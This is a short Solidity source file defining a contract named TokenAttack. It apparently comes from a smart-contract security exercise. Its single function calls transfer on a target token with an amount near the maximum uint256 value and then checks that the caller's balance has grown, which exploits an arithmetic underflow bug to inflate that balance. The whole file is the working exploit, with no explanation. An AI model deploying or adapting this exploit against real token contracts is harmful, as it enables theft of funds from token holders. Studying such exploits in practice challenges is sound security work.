// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./interfaces/IToken.sol";

contract TokenAttack {
    function attack(IToken target) external {
        uint256 balance = target.balanceOf(msg.sender);

        target.transfer(msg.sender, type(uint256).max - balance - 1);

        require(balance < target.balanceOf(msg.sender), "Token: Attack failed");
    }
}
